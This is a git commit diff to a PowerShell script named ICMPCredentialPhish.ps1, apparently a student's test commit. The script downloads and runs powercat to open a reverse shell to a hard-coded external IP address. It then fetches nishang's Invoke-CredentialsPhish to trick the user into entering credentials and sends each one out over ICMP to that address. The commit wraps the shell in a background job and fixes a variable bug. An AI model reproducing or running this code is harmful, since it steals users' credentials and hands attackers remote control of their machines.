70a4f1a828b04f0c95de228ac7b0d0ec84d2c255
unknown <209129@student.pwr.edu.pl>
2020-02-16 07:45:03 +0100

    Test 1

--- Exfiltration/ICMPCredentialPhish.ps1
+++ Exfiltration/ICMPCredentialPhish.ps1
@@ -1,9 +1,12 @@
-﻿$ip = 51.38.185.232
+﻿$ip = "51.38.185.232"
 $port = 413
 
-iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex
-powercat -c 51.38.185.232 -p 413 -ep 
+start-job -ScriptBlock {
+Param($ip,$port)
+    iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex 
+    powercat -c $ip -p $port -ep 
+} -ArgumentList $ip, $port
 
 iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
-Invoke-CredentialsPhish | % { 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $_ -Verbose } }
+Invoke-CredentialsPhish | % { $p = $_; 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $p -Verbose } }
 
